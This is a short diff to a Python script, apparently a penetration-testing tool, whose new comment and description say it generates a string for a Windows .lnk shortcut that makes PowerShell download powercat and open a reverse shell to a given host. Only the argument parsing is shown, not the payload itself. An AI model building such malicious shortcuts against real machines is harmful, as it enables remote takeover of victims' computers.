@@ -1,8 +1,9 @@
+# Generate a string to be used in a .lnk file that causes PowerShell to download powercat and run a reverse shell.
 import argparse
 
 parser = argparse.ArgumentParser(
     prog="Powercat Reverse Shell Generator",
-    description="Generate a Powercat reverse shell with the specified LHOST and LPORT"
+    description="Generate a string to be used in a .lnk file that causes PowerShell to download powercat and run a reverse shell."
 )
 
 parser.add_argument("-l", "--lhost", required=True)
